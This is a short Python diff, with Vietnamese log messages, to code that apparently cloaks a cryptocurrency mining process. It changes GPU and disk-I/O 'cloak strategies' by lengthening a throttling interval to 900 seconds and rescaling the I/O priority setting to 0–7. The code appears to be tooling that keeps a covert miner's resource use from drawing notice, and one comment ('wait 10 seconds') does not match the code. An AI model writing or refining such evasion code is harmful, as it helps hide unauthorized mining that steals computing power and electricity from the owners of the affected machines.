@@ -12,6 +12,7 @@ import pynvml
 import traceback
 import threading
 import time
+import re  
 from abc import ABC, abstractmethod
 from typing import Dict, Any, List, Tuple, Optional, Type
 
@@ -276,7 +277,7 @@ class GpuCloakStrategy(CloakStrategy):
                     self.logger.error(f"[GPU Cloaking] Không thể giới hạn nhiệt độ cho GPU={gpu_index}.")
 
             # Chờ 10 giây trước khi kiểm tra lại
-            time.sleep(60)
+            time.sleep(900)
 
         except psutil.NoSuchProcess as e:
             self.logger.error(f"GPU Cloaking: Tiến trình không tồn tại: {e}")
@@ -432,10 +433,10 @@ class DiskIoCloakStrategy(CloakStrategy):
         self.config = config
         self.disk_io_resource_manager = disk_io_resource_manager
 
-        self.io_weight = config.get('io_weight', 500)
-        if not isinstance(self.io_weight, int) or not (1 <= self.io_weight <= 1000):
-            self.logger.warning(f"io_weight không hợp lệ: {self.io_weight}. Mặc định=500.")
-            self.io_weight = 500
+        self.io_weight = config.get('io_weight', 3)
+        if not isinstance(self.io_weight, int) or not (0 <= self.io_weight <= 7):
+            self.logger.warning(f"io_weight không hợp lệ: {self.io_weight}. Mặc định=3.")
+            self.io_weight = 3
 
     def apply(self, process: MiningProcess) -> None:
         """
